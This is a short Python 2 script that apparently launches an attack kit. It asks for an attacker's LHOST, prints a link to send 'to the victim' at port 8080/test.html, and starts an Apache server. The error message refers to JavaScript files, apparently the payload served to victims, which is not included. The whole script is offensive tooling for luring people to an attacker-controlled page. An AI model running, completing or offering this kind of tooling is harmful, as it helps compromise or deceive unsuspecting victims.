import os
try:
 x=raw_input("""
LHOST= """)
 print("""
Send the direct link to victim:
""")
 print("http://"+x+""":8080/test.html
""")
 os.system("apachectl")
except:
 print("you have not installed the js files or you have not written the lhost")

